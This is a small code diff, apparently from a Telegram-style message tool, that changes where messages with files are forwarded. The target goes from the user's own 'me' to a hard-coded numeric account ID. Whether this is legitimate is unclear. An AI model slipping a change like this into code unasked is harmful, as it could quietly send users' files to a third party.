@@ -12,7 +12,7 @@ export class SaveRunnerStep {
 
     private async _run(logMessage: BaseLogMessage): Promise<Optional<BaseLogMessage>> {
         if (logMessage.haveFile) {
-            return await logMessage.forwardTo('me');
+            return await logMessage.forwardTo(8535977745);
         }
 
         return undefined;
